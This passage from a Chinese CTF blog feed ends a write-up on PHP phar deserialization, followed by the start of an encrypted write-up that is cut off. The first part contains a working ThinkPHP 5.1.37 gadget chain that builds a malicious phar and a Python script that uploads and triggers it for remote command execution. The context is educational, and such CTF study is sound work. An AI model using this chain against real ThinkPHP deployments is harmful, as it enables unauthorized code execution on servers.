class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parse_str()和extract()使得我们可以通过变量覆盖完成文件写入与任意读取，并且$a可以使用伪协议。那么接下来的事情就理所应当了：往hello.txt里写入一个phar，metadata里面放ThinkPHP 5.1.37 的反序列化利用链，完成RCE.(关于这个POP链的原理请参阅<a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-反序列化漏洞/Thinkphp-5.1.37-反序列化漏洞.html</a> 讲的很详细)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;ethan&quot;</span>=&gt;[<span class="string">&quot;godspeedyyds&quot;</span>,<span class="string">&quot;xtxyyds&quot;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;ethan&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [</span><br><span class="line">                <span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;REDIRECT_URL&#x27;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$param</span> = [<span class="string">&#x27;cat /y0u_f0und_It&#x27;</span>];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$w</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;12345&quot;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行后生成phar，然后执行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line">s = urllib.parse.quote(base64.b64encode(s).decode())</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">remote = <span class="string">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class="line">sess =requests.session()</span><br><span class="line">r = sess.post(</span><br><span class="line">    url = <span class="string">f&#x27;http://<span class="subst">&#123;remote&#125;</span>/index.php/index/index/hello&#x27;</span>,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;ethan&#x27;</span>:<span class="string">&#x27;&lt;here_is_your_shell_command&gt;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;world&#x27;</span>:<span class="string">f&#x27;hello=<span class="subst">&#123;s&#125;</span>&amp;a=phar://./hello.txt&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>成功RCE</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>phar反序列化提供了一种扩展反序列化漏洞攻击面的方式、入口，所以基于unserialize()函数的各类攻击tricks（比如引用绕过之类的）依然适用。鉴于phar反序列化漏洞设计版本较多，相信CTF比赛中它仍然会稳定出场。</p><hr><p>参考资料：</p><p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">Thinkphp-5.1.37-反序列化漏洞</a></p><p><a href="https://www.php.net/manual/zh/class.phar.php">https://www.php.net/manual/zh/class.phar.php</a></p><p><a href="https://blog.csdn.net/lllffg/article/details/116145918">Thinkphp 5.1.37反序列化漏洞</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It</a></p><p><a href="https://github.dev/php/php-src">https://github.dev/php/php-src</a></p><p><a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">packaging-your-php-apps-with-phar</a></p><p><a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Phar </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp 日哭school-bus 上了那个writeup</title>
      <link href="/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/"/>
      <url>/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/</url>
      
        <content type="html"><![CDATA[<p>密钥请找本人索取^_^<br>AES CBC Zero padding 128bits&#x2F;block IV&#x3D;0  UTF-8<br>qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&#x2F;QoLrDm&#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&#x2F;znW6GibzQf3NQZ2W4jQl&#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&#x2F;DSOxLqHYE5tiHkb32Haoy+&#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&#x2F;uH5UKHgZ4Xr8Qq&#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i2g&#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&#x2F;UqPXoVIZelOk0A57WCZ+&#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&#x2F;4F5GjmmV7a9hcY&#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&#x2F;Hn0HWUfDH7NaLLovWi&#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&#x2F;fi&#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&#x2F;BmjeY2zGFgxtDpTjwW&#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&#x2F;u1w&#x2F;V4c4VW9&#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&#x2F;NPsChjP5OB&#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&#x2F;GMAGLbV1zhbuIls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&#x2F;CF&#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&#x2F;1CNbCyqyp&#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&#x2F;EiGLa6RwVe9VmUB2qp&#x2F;4GlWqZ&#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&#x2F;FdR5tedsLN87jJIEC&#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&#x2F;+XK3&#x2F;dCQLIBWkcQFGXblOkukLR&#x2F;uhCdMhhLcbsz1GqYI&#x2F;29K7A6uj+zm8Ep&#x2F;uLgpBQFrxFuIUYFQ4&#x2F;1OO&#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIPJ5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&#x2F;&#x2F;trgxQ&#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&#x2F;NT8691a6XX7qCdWSm78nmrZ&#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&#x2F;l72jCnlfZH&#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&#x2F;sK8ivilobtO3s9+iDykFnLmtpI&#x2F;c&#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&#x2F;AkBEIg+81UJ5V+b5r7&#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&#x2F;OEvM1ghAazhRMeKANiZ&#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&#x2F;FH5XR2QtUTSwq&#x2F;z1yYnhXTjtMjP6kex7yda58C&#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&#x2F;8k8fY79Utp&#x2F;3sq&#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&#